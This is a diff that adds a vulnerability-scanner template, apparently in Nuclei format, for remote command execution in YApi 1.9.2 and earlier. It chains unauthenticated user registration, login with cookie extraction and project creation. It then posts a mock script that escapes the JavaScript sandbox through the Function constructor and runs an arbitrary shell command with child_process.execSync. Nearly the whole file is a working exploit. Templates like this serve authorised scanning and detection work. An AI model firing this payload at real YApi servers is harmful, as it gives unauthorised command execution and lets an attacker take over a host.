@@ -1,0 +1,115 @@
+id: yapi-mock-rce
+
+info:
+  name: YApi Mock Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    YApi versions <=1.9.2 have a vulnerability that allows unauthorized users to create users and execute arbitrary commands via the mock feature. This template exploits this vulnerability to achieve remote code execution.
+  reference:
+    - https://github.com/YMFE/yapi/issues/2099
+    - https://github.com/YMFE/yapi/issues/2233
+    - https://mp.weixin.qq.com/s/FAMfCxvdvW-VK99k_7NYxA
+
+variables:
+  email: "YApitest@gmail.com"
+  password: "YApi"
+  cmd: "id"
+
+http:
+  - id: register-user
+    method: POST
+    path:
+      - "{{BaseURL}}/api/user/reg"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "email": "{{email}}",
+        "password": "{{password}}",
+        "username": "{{password}}"
+      }
+    matchers:
+      - type: word
+        words:
+          - "200"
+        part: status
+
+  - id: login-user
+    method: POST
+    path:
+      - "{{BaseURL}}/api/user/login"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "email": "{{email}}",
+        "password": "{{password}}"
+      }
+    extractors:
+      - type: regex
+        name: yapi_token
+        regex:
+          - "Set-Cookie: _yapi_token=(.*?);"
+        part: header
+        internal: true
+      - type: regex
+        name: yapi_uid
+        regex:
+          - "Set-Cookie: _yapi_uid=(.*?);"
+        part: header
+        internal: true
+    matchers:
+      - type: word
+        words:
+          - "200"
+        part: status
+
+  - id: create-project
+    method: POST
+    path:
+      - "{{BaseURL}}/api/project/add"
+    headers:
+      Content-Type: application/json
+      Cookie: "_yapi_token={{yapi_token}}; _yapi_uid={{yapi_uid}}"
+    body: |
+      {
+        "name": "{{password}}",
+        "basepath": "/{{password}}",
+        "group_id": "1",
+        "icon": "code-o",
+        "color": "red",
+        "project_type": "private"
+      }
+    extractors:
+      - type: regex
+        name: project_id
+        regex:
+          - "\"_id\":(.*?),"
+        part: body
+        internal: true
+    matchers:
+      - type: word
+        words:
+          - "200"
+        part: status
+
+  - id: execute-command
+    method: POST
+    path:
+      - "{{BaseURL}}/api/plugin/advmock/save"
+    headers:
+      Content-Type: application/json
+      Cookie: "_yapi_token={{yapi_token}}; _yapi_uid={{yapi_uid}}"
+    body: |
+      {
+        "project_id": "{{project_id}}",
+        "interface_id": "1",
+        "mock_script": "const sandbox = this\nconst ObjectConstructor = this.constructor\nconst FunctionConstructor = ObjectConstructor.constructor\nconst myfun = FunctionConstructor('return process')\nconst process = myfun()\nmockJson = process.mainModule.require(\"child_process\").execSync(\"{{cmd}}\").toString()",
+        "enable": true
+      }
+    matchers:
+      - type: word
+        words:
+          - "200"
+        part: status
